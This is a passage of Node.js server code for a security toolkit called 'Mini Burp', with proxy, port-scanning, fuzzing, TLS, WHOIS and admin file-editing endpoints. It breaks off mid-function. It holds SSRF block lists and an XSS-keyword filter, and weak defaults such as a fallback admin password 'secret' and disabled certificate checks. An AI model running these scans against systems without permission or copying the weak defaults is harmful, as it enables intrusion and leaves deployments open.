import http from "http";
import https from "https";
import net from "net";
import tls from "tls";
import fs from "fs";
import nodePath from "path";
import { lookup } from "dns/promises";
import { fileURLToPath } from "url";
import Database from "better-sqlite3";
import PDFDocument from "pdfkit";
const __dirname = nodePath.dirname(fileURLToPath(import.meta.url));
const PORT = process.env.PORT || 8080;
const MAX_BODY = 1 * 1024 * 1024; // 1 MB
const DIST_DIR = nodePath.join(__dirname, "dist");
const DATA_DIR = process.env.DATA_DIR || __dirname;
const DB_PATH = nodePath.join(DATA_DIR, "miniburp.db");
// ── Database ──────────────────────────────────────────────────────────────────
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
const db = new Database(DB_PATH);
db.pragma("journal_mode = WAL");
db.exec(`
  CREATE TABLE IF NOT EXISTS stats (
    key   TEXT PRIMARY KEY,
    value INTEGER DEFAULT 0
  );
  INSERT OR IGNORE INTO stats VALUES ('proxy_hits', 0);
  INSERT OR IGNORE INTO stats VALUES ('scan_hits', 0);
  INSERT OR IGNORE INTO stats VALUES ('fuzz_hits', 0);
  INSERT OR IGNORE INTO stats VALUES ('header_hits', 0);
  INSERT OR IGNORE INTO stats VALUES ('blocked_ssrf', 0);
  INSERT OR IGNORE INTO stats VALUES ('rate_limited', 0);
  INSERT OR IGNORE INTO stats VALUES ('waf_hits', 0);
  INSERT OR IGNORE INTO stats VALUES ('req_count', 0);
  CREATE TABLE IF NOT EXISTS scan_history (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    host       TEXT NOT NULL,
    open_ports TEXT,
    created_at INTEGER DEFAULT (unixepoch())
  );
  CREATE TABLE IF NOT EXISTS proxy_history (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    url        TEXT NOT NULL,
    method     TEXT DEFAULT 'GET',
    status     INTEGER,
    created_at INTEGER DEFAULT (unixepoch())
  );
  CREATE TABLE IF NOT EXISTS fuzz_history (
    id             INTEGER PRIMARY KEY AUTOINCREMENT,
    url            TEXT NOT NULL,
    payloads_count INTEGER,
    results        TEXT,
    created_at     INTEGER DEFAULT (unixepoch())
  );

  CREATE TABLE IF NOT EXISTS full_reports (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    host TEXT NOT NULL,
    report TEXT,
    created_at INTEGER DEFAULT (unixepoch())
  );

  CREATE TABLE IF NOT EXISTS blocked_hosts (
    host TEXT PRIMARY KEY
  );
`);
const incStat = db.prepare("UPDATE stats SET value = value + 1 WHERE key = ?");
const getStat = db.prepare("SELECT value FROM stats WHERE key = ?");
const allStats = db.prepare("SELECT key, value FROM stats");
function stat(key) { return getStat.get(key)?.value ?? 0; }
// ── SSRF guard ────────────────────────────────────────────────────────────────
const PRIVATE_IP_RE = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|169\.254\.|::1$|fc00:|fe80:)/i;
const BLOCKED_HOSTS = new Set(["localhost", "metadata.google.internal", "169.254.169.254"]);
async function isBlockedTarget(hostname) {
  if (!hostname) return true;
  const h = hostname.toLowerCase();
  if (BLOCKED_HOSTS.has(h)) return true;
  // Exact match + suffix match (блокирует субдомены заблокированного домена)
  const dbBlocks = db.prepare("SELECT host FROM blocked_hosts").all();
  for (const { host: blocked } of dbBlocks) {
    if (h === blocked || h.endsWith("." + blocked)) return true;
  }
  if (PRIVATE_IP_RE.test(h)) return true;
  try {
    const addrs = await lookup(h, { all: true });
    for (const { address } of addrs) {
      if (PRIVATE_IP_RE.test(address) || BLOCKED_HOSTS.has(address)) return true;
    }
  } catch {
    return true;
  }
  return false;
}
function isValidUrl(raw) {
  try {
    const u = new URL(raw);
    return u.protocol === "http:" || u.protocol === "https:";
  } catch { return false; }
}
// ── Rate limiter ──────────────────────────────────────────────────────────────
const rateLimits = new Map();
const RATE_WINDOW = 60_000;
const RATE_LIMITS = { "/proxy": 200, "/request": 100, "/portscan": 10, "/headers": 100, "/fuzz": 50, "/ssl": 20 };
function checkRate(ip, route) {
  const limit = RATE_LIMITS[route];
  if (!limit) return false;
  const key = `${ip}:${route}`;
  const now = Date.now();
  const entry = rateLimits.get(key);
  if (!entry || now > entry.resetAt) { rateLimits.set(key, { count: 1, resetAt: now + RATE_WINDOW }); return false; }
  if (entry.count >= limit) return true;
  entry.count++;
  return false;
}
setInterval(() => { const now = Date.now(); for (const [k, v] of rateLimits) if (now > v.resetAt) rateLimits.delete(k); }, 300_000);
// ── Headers ───────────────────────────────────────────────────────────────────
const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";
function secHeaders(res) {
  res.setHeader("Access-Control-Allow-Origin", CORS_ORIGIN);
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, HEAD, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Strict-Transport-Security", "max-age=63072000");
  res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.railway.app; connect-src 'self' https://*.railway.app; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' https://fonts.gstatic.com;");
  res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
}
function send(res, status, body) {
  secHeaders(res);
  res.writeHead(status, { "Content-Type": "application/json" });
  res.end(JSON.stringify(body));
}
// ── Proxy ─────────────────────────────────────────────────────────────────────
const HOP_BY_HOP = new Set(["host", "connection", "keep-alive", "transfer-encoding", "te", "upgrade", "proxy-authorization", "content-length"]);
function proxyRequest(targetUrl, method, reqHeaders, body, res, _redirectCount = 0) {
  if (_redirectCount > 5) {
    send(res, 502, { error: "Too many redirects", url: targetUrl });
    return;
  }
  const parsed = new URL(targetUrl);
  const lib = parsed.protocol === "https:" ? https : http;
  const safeHeaders = {};
  for (const [k, v] of Object.entries(reqHeaders || {})) {
    if (!HOP_BY_HOP.has(k.toLowerCase())) safeHeaders[k] = v;
  }
  const options = {
    hostname: parsed.hostname,
    port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
    path: (parsed.pathname + parsed.search) || "/",
    method: method || "GET",
    headers: { ...safeHeaders, host: parsed.hostname },
    timeout: 15000,
    rejectUnauthorized: false,
  };
  const preq = lib.request(options, pres => {
    if ([301, 302, 303, 307, 308].includes(pres.statusCode) && pres.headers.location) {
      let nextMethod = method;
      let nextBody = body;
      if ([301, 302, 303].includes(pres.statusCode)) {
        nextMethod = "GET";
        nextBody = null;
      }
      try {
        const redirectUrl = new URL(pres.headers.location, targetUrl).href;
        return proxyRequest(redirectUrl, nextMethod, reqHeaders, nextBody, res, _redirectCount + 1);
      } catch (e) {
        // invalid location header
      }
    }
    secHeaders(res);
    res.writeHead(200, { "Content-Type": "application/json" });
    let data = "";
    pres.on("data", c => (data += c));
    pres.on("end", () => {
      const respHeaders = {};
      Object.keys(pres.headers).forEach(k => (respHeaders[k] = pres.headers[k]));
      res.end(JSON.stringify({ status: pres.statusCode, statusText: pres.statusMessage, headers: respHeaders, body: data, url: targetUrl }));
    });
  });
  preq.on("error", () => send(res, 200, { error: "Request failed", url: targetUrl }));
  preq.on("timeout", () => preq.destroy());
  if (body) preq.write(body);
  preq.end();
}
// ── Port scanner ──────────────────────────────────────────────────────────────
function scanPort(host, port, timeout = 2000) {
  return new Promise(resolve => {
    const sock = new net.Socket();
    sock.setTimeout(timeout);
    sock.on("connect", () => { sock.destroy(); resolve({ port, status: "open" }); });
    sock.on("timeout", () => { sock.destroy(); resolve({ port, status: "closed" }); });
    sock.on("error", () => { sock.destroy(); resolve({ port, status: "closed" }); });
    sock.connect(port, host);
  });
}
function checkTLS(host, port = 443, timeout = 5000) {
  return new Promise((resolve) => {
    const socket = tls.connect({
      host,
      port,
      servername: host,
      timeout,
      rejectUnauthorized: false
    }, () => {
      const cert = socket.getPeerCertificate(true);
      const protocol = socket.getProtocol();
      const cipher = socket.getCipher();
      const validTo = cert.valid_to ? new Date(cert.valid_to).getTime() : 0;
      const daysLeft = validTo ? Math.floor((validTo - Date.now()) / (1000 * 60 * 60 * 24)) : 0;
      resolve({
        valid: socket.authorized || false,
        protocol,
        cipher: cipher.name,
        issuer: cert.issuer?.O,
        subject: cert.subject?.CN,
        validTo: cert.valid_to,
        daysLeft,
        error: socket.authorizationError
      });
      socket.destroy();
    });
    socket.on("timeout", () => {
      socket.destroy();
      resolve({ error: "timeout" });
    });
    socket.on("error", (err) => {
      socket.destroy();
      resolve({ error: err.message });
    });
  });
}
const PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 8888, 27017];
// ── Server ────────────────────────────────────────────────────────────────────
http.createServer(async (req, res) => {
  if (req.method === "OPTIONS") { secHeaders(res); res.writeHead(204); res.end(); return; }
  const clientIP = req.socket.remoteAddress || "unknown";
  const parsed = new URL(req.url, "http://localhost");
  const path = parsed.pathname;
  // Basic WAF — не применяем к /proxy и /request, иначе блокируем собственные тесты
  if (path !== "/proxy" && path !== "/request" && path !== "/fuzz") {
    if (/(%3C|<)script(%3E|>)/i.test(parsed.search) || /javascript:/i.test(parsed.search) || /on\w+=/i.test(parsed.search)) {
      incStat.run("waf_hits");
      send(res, 403, { error: "WAF: XSS payload detected" });
      return;
    }
  }
  incStat.run("req_count");
  if (checkRate(clientIP, path)) { incStat.run("rate_limited"); send(res, 429, { error: "Too many requests. Try again in a minute." }); return; }
  // Read body with 1 MB limit
  let body = "", bodySize = 0, aborted = false;
  req.on("data", chunk => {
    bodySize += chunk.length;
    if (bodySize > MAX_BODY) { aborted = true; req.destroy(); send(res, 413, { error: "Request body too large (max 1MB)" }); }
    else body += chunk;
  });
  await new Promise(r => req.on("end", r));
  if (aborted) return;
  // GET /proxy?url=...
  if (path === "/proxy") {
    const target = parsed.searchParams.get("url");
    if (!target || !isValidUrl(target)) { send(res, 400, { error: "Invalid or missing url parameter" }); return; }
    if (await isBlockedTarget(new URL(target).hostname)) { incStat.run("blocked_ssrf"); send(res, 403, { error: "Target not allowed" }); return; }
    incStat.run("proxy_hits");
    db.prepare("INSERT INTO proxy_history (url, method) VALUES (?, 'GET')").run(target);
    proxyRequest(target, "GET", {}, null, res);
    return;
  }
  // POST /request
  if (path === "/request" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON body" }); return; }
    if (!payload.url || !isValidUrl(payload.url)) { send(res, 400, { error: "Invalid or missing url" }); return; }
    if (await isBlockedTarget(new URL(payload.url).hostname)) { incStat.run("blocked_ssrf"); send(res, 403, { error: "Target not allowed" }); return; }
    const SAFE = new Set(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]);
    const method = (payload.method || "GET").toUpperCase();
    if (!SAFE.has(method)) { send(res, 400, { error: "Invalid HTTP method" }); return; }
    incStat.run("proxy_hits");
    db.prepare("INSERT INTO proxy_history (url, method) VALUES (?, ?)").run(payload.url, method);

    const analyzeServerConfig = async (reqData, resData) => {
      try {
        const apiKey = process.env.OPENROUTER_API_KEY;
        if (!apiKey) return "AI analysis skipped: OPENROUTER_API_KEY not configured.";

        const sysContext = `You are an HTTP traffic analyzer for a security scanner. Analyze the provided request and response data and give a concise technical assessment: identify potential vulnerabilities, interesting headers, or security misconfigurations. Be brief and technical.`;
        const prompt = `Request:\nMethod: ${reqData.method}\nURL: ${reqData.url}\nHeaders: ${JSON.stringify(reqData.headers)}\n\nResponse:\nStatus: ${resData.status}\nHeaders: ${JSON.stringify(resData.headers)}\nBody Sample (first 500 chars): ${String(resData.body).substring(0, 500)}`;

        const response = await fetch("https://openrouter.ai/api/v1/chat/completions", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${apiKey}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            model: "google/gemini-2.0-flash-001",
            messages: [
              { role: "system", content: sysContext },
              { role: "user", content: prompt }
            ]
          })
        });

        if (!response.ok) {
          const errData = await response.text();
          return `AI Analysis Failed: API Error ${response.status} - ${errData}`;
        }

        const result = await response.json();
        if (result.choices && result.choices.length > 0 && result.choices[0].message) {
          return result.choices[0].message.content;
        } else {
          return `AI Analysis Failed: Unexpected response format`;
        }
      } catch (err) {
        return `AI Analysis Failed: ${err.message}`;
      }
    };

    // Use a custom response handler for proxyRequest to inject AI analysis
    const customRes = {
      setHeader: res.setHeader.bind(res),
      writeHead: res.writeHead.bind(res),
      end: async (chunk) => {
        try {
          const resObj = JSON.parse(chunk);
          const aiAnalysis = await analyzeServerConfig({ url: payload.url, method, headers: payload.headers || {} }, resObj);
          resObj.aiAnalysis = aiAnalysis;
          res.end(JSON.stringify(resObj));
        } catch {
          res.end(chunk);
        }
      }
    };

    proxyRequest(payload.url, method, payload.headers || {}, payload.body || null, customRes);
    return;
  }
  // GET /portscan?host=...
  if (path === "/portscan") {
    const host = parsed.searchParams.get("host");
    if (!host) { send(res, 400, { error: "Missing host parameter" }); return; }
    if (await isBlockedTarget(host)) { incStat.run("blocked_ssrf"); send(res, 403, { error: "Target not allowed" }); return; }
    incStat.run("scan_hits");
    secHeaders(res);
    res.writeHead(200, { "Content-Type": "application/json" });
    const results = await Promise.all(PORTS.map(p => scanPort(host, p)));
    const openPorts = results.filter(r => r.status === "open").map(r => r.port);
    db.prepare("INSERT INTO scan_history (host, open_ports) VALUES (?, ?)").run(host, JSON.stringify(openPorts));
    res.end(JSON.stringify({ host, results }));
    return;
  }
  // GET /ssl?host=...
  if (path === "/ssl") {
    const host = parsed.searchParams.get("host");
    if (!host) { send(res, 400, { error: "Missing host parameter" }); return; }
    if (await isBlockedTarget(host)) { send(res, 403, { error: "Target not allowed" }); return; }
    const result = await checkTLS(host);
    send(res, 200, result);
    return;
  }
  // GET /headers?url=...
  if (path === "/headers") {
    const target = parsed.searchParams.get("url");
    if (!target || !isValidUrl(target)) { send(res, 400, { error: "Invalid or missing url parameter" }); return; }
    if (await isBlockedTarget(new URL(target).hostname)) { incStat.run("blocked_ssrf"); send(res, 403, { error: "Target not allowed" }); return; }
    incStat.run("header_hits");
    proxyRequest(target, "HEAD", {}, null, res);
    return;
  }
  // POST /fuzz  { url: "https://target.com/§payload§", payloads: [] }
  if (path === "/fuzz" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
    const { url: fuzzUrl, payloads } = payload;
    if (!fuzzUrl || typeof fuzzUrl !== "string") { send(res, 400, { error: "Missing url" }); return; }
    if (!Array.isArray(payloads) || payloads.length === 0) { send(res, 400, { error: "Missing payloads array" }); return; }
    if (payloads.length > 100) { send(res, 400, { error: "Max 100 payloads per request" }); return; }
    // Validate the base URL (with a placeholder substituted)
    const testUrl = fuzzUrl.replace(/§[^§]*§/, "test");
    if (!isValidUrl(testUrl)) { send(res, 400, { error: "Invalid url pattern" }); return; }
    if (await isBlockedTarget(new URL(testUrl).hostname)) { send(res, 403, { error: "Target not allowed" }); return; }
    const results = [];
    for (const p of payloads) {
      const actualUrl = fuzzUrl.replace(/§[^§]*§/g, encodeURIComponent(String(p)));
      if (!isValidUrl(actualUrl)) { results.push({ payload: p, error: "Invalid URL" }); continue; }
      const t = Date.now();
      try {
        await new Promise((resolve, reject) => {
          const parsed2 = new URL(actualUrl);
          const lib2 = parsed2.protocol === "https:" ? https : http;
          const req2 = lib2.request({
            hostname: parsed2.hostname,
            port: parsed2.port || (parsed2.protocol === "https:" ? 443 : 80),
            path: (parsed2.pathname + parsed2.search) || "/",
            method: "GET",
            headers: { host: parsed2.hostname, "User-Agent": "SecurityScanner/1.0" },
            timeout: 8000,
            rejectUnauthorized: false,
          }, res2 => {
            let data2 = "";
            res2.on("data", c => { if (data2.length < 50000) data2 += c; });
            res2.on("end", () => {
              results.push({ payload: p, status: res2.statusCode, length: data2.length, time: Date.now() - t });
              resolve();
            });
          });
          req2.on("error", () => { results.push({ payload: p, status: 0, length: 0, time: Date.now() - t, error: "Request failed" }); resolve(); });
          req2.on("timeout", () => { req2.destroy(); results.push({ payload: p, status: 0, length: 0, time: Date.now() - t, error: "Timeout" }); resolve(); });
          req2.end();
        });
      } catch { results.push({ payload: p, error: "Exception", status: 0, length: 0, time: 0 }); }
      await new Promise(r => setTimeout(r, 100));
    }
    incStat.run("fuzz_hits");
    db.prepare("INSERT INTO fuzz_history (url, payloads_count, results) VALUES (?, ?, ?)").run(fuzzUrl, payloads.length, JSON.stringify(results));
    send(res, 200, { results });
    return;
  }
  // POST /report
  if (path === "/report" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON body" }); return; }
    if (!payload.target || !payload.results) { send(res, 400, { error: "Missing target or results" }); return; }

    secHeaders(res);
    res.setHeader("Content-Type", "application/pdf");
    res.setHeader("Content-Disposition", `attachment; filename=miniburp-report-${payload.target.replace(/\./g, "_")}.pdf`);

    const doc = new PDFDocument({ margin: 50 });
    doc.pipe(res);

    doc.fontSize(20).text("Mini Burp Security Report", { align: "center" });
    doc.moveDown();
    doc.fontSize(12).text(`Target: ${payload.target}`);
    doc.text(`Date: ${new Date().toISOString()}`);
    if (payload.results.score) {
      doc.moveDown(1);
      doc.fontSize(16).fillColor(payload.results.score.severity === "high" ? "red" : payload.results.score.severity === "medium" ? "orange" : "green").text(`Security Score: ${payload.results.score.summary}`);
      doc.fillColor("black").fontSize(12);
    }
    doc.moveDown(2);

    // Add summary graph/stats
    let high = 0, medium = 0, low = 0, info = 0;
    for (const r of Object.values(payload.results)) {
      if (r.severity === "critical" || r.severity === "high") high++;
      else if (r.severity === "medium") medium++;
      else if (r.severity === "low") low++;
      else info++;
    }

    doc.fontSize(14).text("Summary");
    doc.fontSize(10).fillColor("red").text(`Critical/High: ${high}`);
    doc.fillColor("orange").text(`Medium: ${medium}`);
    doc.fillColor("green").text(`Low: ${low}`);
    doc.fillColor("gray").text(`Info: ${info}`);
    doc.fillColor("black");
    doc.moveDown(2);

    for (const [id, r] of Object.entries(payload.results)) {
      doc.fontSize(14).fillColor("black").text(r.label || id);
      const color = (r.severity === "critical" || r.severity === "high") ? "red" : (r.severity === "medium" ? "orange" : (r.severity === "low" ? "green" : "gray"));
      doc.fontSize(10).fillColor(color).text(`Severity: ${r.severity.toUpperCase()} | ${r.summary}`);
      doc.fillColor("black").moveDown(0.5);
      if (r.lines) {
        doc.font("Courier").fontSize(8);
        for (const l of r.lines) doc.text(l.replace(/[\u2713\u2717\u2192\u26A0\u2022]/g, "*")); // Replace problematic unicode chars
        doc.font("Helvetica").fontSize(10);
      }
      if (r.recs && r.recs.length > 0) {
        doc.moveDown(0.5);
        doc.fillColor("blue").text("Recommendations:");
        for (const rec of r.recs) doc.text(`- ${rec}`);
        doc.fillColor("black");
      }
      doc.moveDown();
    }

    doc.end();
    return;
  }

  // POST /report-save
  if (path === "/report-save" && req.method === "POST") {
    let payload;
    try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
    const { host, report } = payload;
    if (!host || !report) { send(res, 400, { error: "Missing host or report" }); return; }

    const prev = db.prepare("SELECT report, created_at FROM full_reports WHERE host = ? ORDER BY id DESC LIMIT 1").get(host);
    db.prepare("INSERT INTO full_reports (host, report) VALUES (?, ?)").run(host, JSON.stringify(report));

    send(res, 200, { prev: prev ? JSON.parse(prev.report) : null, prev_date: prev ? prev.created_at : null });
    return;
  }

  // GET /history?type=all|scans|proxy|fuzz&limit=50
  if (path === "/history") {
    const type = parsed.searchParams.get("type") || "all";
    const limit = Math.min(parseInt(parsed.searchParams.get("limit") || "50", 10), 200);
    const result = {};
    if (type === "all" || type === "scans") result.scans = db.prepare("SELECT id,host,open_ports,created_at FROM scan_history ORDER BY id DESC LIMIT ?").all(limit);
    if (type === "all" || type === "proxy") result.proxy = db.prepare("SELECT id,url,method,status,created_at FROM proxy_history ORDER BY id DESC LIMIT ?").all(limit);
    if (type === "all" || type === "fuzz") result.fuzz = db.prepare("SELECT id,url,payloads_count,created_at FROM fuzz_history ORDER BY id DESC LIMIT ?").all(limit);
    send(res, 200, result);
    return;
  }

  // ── Admin API ─────────────────────────────────────────────────────────────────
  const adminPass = process.env.ADMIN_PASSWORD || "secret";
  const checkAdmin = (req) => req.headers["x-admin-password"] === adminPass;

  if (path.startsWith("/api/admin")) {
    if (!checkAdmin(req)) {
      send(res, 401, { error: "Unauthorized" });
      return;
    }

    if (path === "/api/admin/stats" && req.method === "GET") {
      const stats = Object.fromEntries(allStats.all().map(r => [r.key, r.value]));
      const recentScans = db.prepare("SELECT * FROM scan_history ORDER BY id DESC LIMIT 100").all();
      const recentReports = db.prepare("SELECT id, host, created_at, length(report) as size, json_extract(report, '$._score') as score FROM full_reports ORDER BY id DESC LIMIT 100").all();

      let sevStats = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
      let avgScore = 0;
      let totalScore = 0;
      let scoredReports = 0;
      const allReports = db.prepare("SELECT report FROM full_reports").all();
      for (const r of allReports) {
        try {
          const parsed = JSON.parse(r.report);
          if (parsed._score !== undefined) {
            totalScore += parsed._score;
            scoredReports++;
          }
          for (const key of Object.keys(parsed)) {
            if (key === "_score") continue;
            const s = parsed[key].severity;
            if (sevStats[s] !== undefined) sevStats[s]++;
          }
        } catch { }
      }
      if (scoredReports > 0) avgScore = Math.round(totalScore / scoredReports);

      const osData = {
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        railway: !!process.env.RAILWAY_PROJECT_ID
      };

      send(res, 200, { stats, recentScans, recentReports, sevStats, osData, avgScore });
      return;
    }

    if (path === "/api/admin/history" && req.method === "DELETE") {
      db.prepare("DELETE FROM scan_history").run();
      db.prepare("DELETE FROM full_reports").run();
      send(res, 200, { ok: true });
      return;
    }

    if (path === "/api/admin/blocks" && req.method === "GET") {
      const blocks = db.prepare("SELECT host FROM blocked_hosts").all();
      send(res, 200, { blocks });
      return;
    }

    if (path === "/api/admin/blocks" && req.method === "POST") {
      let payload;
      try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
      if (!payload.host) { send(res, 400, { error: "Missing host" }); return; }
      db.prepare("INSERT OR IGNORE INTO blocked_hosts (host) VALUES (?)").run(payload.host.toLowerCase());
      send(res, 200, { ok: true });
      return;
    }

    if (path === "/api/admin/blocks" && req.method === "DELETE") {
      let payload;
      try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
      if (!payload.host) { send(res, 400, { error: "Missing host" }); return; }
      db.prepare("DELETE FROM blocked_hosts WHERE host = ?").run(payload.host.toLowerCase());
      send(res, 200, { ok: true });
      return;
    }

    // POST /api/admin/chat — AI Chat proxy to OpenRouter
    if (path === "/api/admin/chat" && req.method === "POST") {
      let payload;
      try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }
      const { messages: chatMessages, model: chatModel, apiKey: clientApiKey } = payload;
      const orKey = clientApiKey || process.env.OPENROUTER_API_KEY;
      if (!orKey) { send(res, 400, { error: "No API key provided. Set it in AI Chat settings." }); return; }
      if (!Array.isArray(chatMessages) || chatMessages.length === 0) { send(res, 400, { error: "No messages" }); return; }

      try {
        const orResponse = await fetch("https://openrouter.ai/api/v1/chat/completions", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${orKey}`,
            "Content-Type": "application/json",
            "HTTP-Referer": "https://miniburp.app",
            "X-Title": "Mini Burp AI Assistant",
          },
          body: JSON.stringify({
            model: chatModel || "google/gemma-3-27b-it:free",
            messages: chatMessages,
            max_tokens: 4096,
            stream: true, // Enable streaming
          }),
        });

        if (!orResponse.ok) {
          const errText = await orResponse.text();
          send(res, 200, { error: `OpenRouter API error ${orResponse.status}: ${errText}` });
          return;
        }

        // Set up SSE headers
        res.writeHead(200, {
          "Content-Type": "text/event-stream",
          "Cache-Control": "no-cache",
          "Connection": "keep-alive",
          "Access-Control-Allow-Origin": "*",
        });

        // Use node-fetch/undici stream
        const reader = orResponse.body.getReader();
        const decoder = new TextDecoder();

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          const chunk = decoder.decode(value, { stream: true });
          res.write(chunk);
        }

        res.end();
      } catch (err) {
        // If headers weren't sent yet, send JSON error. Otherwise just end the stream.
        if (!res.headersSent) {
          send(res, 200, { error: `Request failed: ${err.message}` });
        } else {
          res.end();
        }
      }
      return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // FILE EDITOR ENDPOINTS
    // ═══════════════════════════════════════════════════════════════════════

    // Dirs/files to hide from the file tree
    const EDITOR_EXCLUDE = new Set([
      "node_modules", "dist", ".git", ".cache",
      "miniburp.db", "miniburp.db-shm", "miniburp.db-wal",
      "package-lock.json",
    ]);

    // Helper: build recursive file tree
    function buildFileTree(dir, relBase = "") {
      const entries = [];
      let names;
      try { names = fs.readdirSync(dir).sort(); } catch { return entries; }

      for (const name of names) {
        if (EDITOR_EXCLUDE.has(name) || name.startsWith(".")) continue;
        const abs = nodePath.join(dir, name);
        const rel = relBase ? `${relBase}/${name}` : name;
        let stat;
        try { stat = fs.statSync(abs); } catch { continue; }

        if (stat.isDirectory()) {
          entries.push({ name, path: rel, type: "dir", children: buildFileTree(abs, rel) });
        } else {
          entries.push({ name, path: rel, type: "file", size: stat.size });
        }
      }
      return entries;
    }

    // GET /api/admin/files — return the project file tree
    if (path === "/api/admin/files" && req.method === "GET") {
      try {
        send(res, 200, { tree: buildFileTree(__dirname) });
      } catch (err) {
        send(res, 500, { error: err.message });
      }
      return;
    }

    // GET /api/admin/file?path=src/tabs/AdminTab.jsx — read file contents
    if (path === "/api/admin/file" && req.method === "GET") {
      const filePath = parsed.searchParams.get("path");
      if (!filePath) { send(res, 400, { error: "Missing path" }); return; }

      const abs = nodePath.resolve(__dirname, filePath);
      // Path traversal guard
      if (!abs.startsWith(__dirname + nodePath.sep) && abs !== __dirname) {
        send(res, 403, { error: "Forbidden" }); return;
      }
      try {
        const content = fs.readFileSync(abs, "utf8");
        send(res, 200, { path: filePath, content });
      } catch {
        send(res, 404, { error: "File not found" });
      }
      return;
    }

    // PUT /api/admin/file — save file   body: { path, content }
    if (path === "/api/admin/file" && req.method === "PUT") {
      let payload;
      try { payload = JSON.parse(body); } catch { send(res, 400, { error: "Invalid JSON" }); return; }

      const { path: filePath, content } = payload;
      if (!filePath || content === undefined) {
        send(res, 400, { error: "Missing path or content" }); return;
      }

      const abs = nodePath.resolve(__dirname, filePath);
      // Path traversal guard
      if (!abs.startsWith(__dirname + nodePath.sep) && abs !== __dirname) {
        send(res, 403, { error: "Forbidden" }); return;
      }
      // Refuse to overwrite the database
      if (abs === nodePath.resolve(__dirname, "miniburp.db")) {
        send(res, 403, { error: "Cannot overwrite database" }); return;
      }
      try {
        fs.writeFileSync(abs, content, "utf8");
        send(res, 200, { ok: true });
      } catch (err) {
        send(res, 500, { error: err.message });
      }
      return;
    }
  }
  // GET /whois?domain=example.com
  if (path === "/whois") {
    const domain = parsed.searchParams.get("domain");
    if (!domain) { send(res, 400, { error: "Missing domain" }); return; }
    const cleanDomain = domain.replace(/^https?:\/\//, "").split("/")[0].toLowerCase();
    if (await isBlockedTarget(cleanDomain)) { send(res, 403, { error: "Target not allowed" }); return; }
    // Build candidates: try full hostname, then strip subdomains one by one
    const parts = cleanDomain.split(".");
    const candidates = [];
    for (let i = 0; i <= parts.length - 2; i++) candidates.push(parts.slice(i).join("."));
    const rdapFetch = (d) => new Promise((resolve, reject) => {
      const req2 = https.get({
        hostname: "rdap.org",
        path: `/domain/${encodeURIComponent(d)}`,
        headers: { Accept: "application/json", "User-Agent": "SecurityScanner/1.0" },
        timeout: 8000,
      }, r2 => {
        let data = "";
        r2.on("data", c => { if (data.length < 100000) data += c; });
        r2.on("end", () => resolve({ status: r2.statusCode, body: data }));
      });
      req2.on("error", reject);
      req2.on("timeout", () => { req2.destroy(); reject(new Error("timeout")); });
    });
    try {
      for (const candidate of candidates) {
        const rdapData = await rdapFetch(candidate);
        if (rdapData.status === 200) { send(res, 200, { status: 200, body: rdapData.body, resolvedDomain: candidate }); return; }
      }
      send(res, 200, { error: "WHOIS not found for this domain" });
    } catch {
      send(res, 200, { error: "WHOIS lookup failed" });
    }
    return;
  }
  // ── External Scanner APIs ─────────────────────────────────────────────────────

  // Helper: fetch JSON from external API
  const extFetch = (url, options = {}) => new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const lib = parsed.protocol === "https:" ? https : http;
    const req = lib.request({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: options.method || "GET",
      headers: {
        "User-Agent": "MiniSherlock/1.0",
        "Accept": "application/json",
        ...options.headers,
      },
      timeout: 15000,
      rejectUnauthorized: false,
    }, (res2) => {
      let data = "";
      res2.on("data", c => { if (data.length < 500000) data += c; });
      res2.on("end", () => {
        try { resolve({ status: res2.statusCode, data: JSON.parse(data) }); }
        catch { resolve({ status: res2.statusCode, data, raw: true }); }
      });
    });
    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("timeout")); });
    if (options.body) req.write(options.body);
    req.end();
  });

  // 1. GET /api/scanner/cve?query=apache+2.4.49
  // Search NIST NVD for CVEs by keyword
  if (path === "/api/scanner/cve") {
    const query = parsed.searchParams.get("query");
    if (!query) { send(res, 400, { error: "Missing query param" }); return; }
    try {
      const r = await extFetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}&resultsPerPage=10`);
      const cves = (r.data?.vulnerabilities || []).map(v => {
        const cve = v.cve;
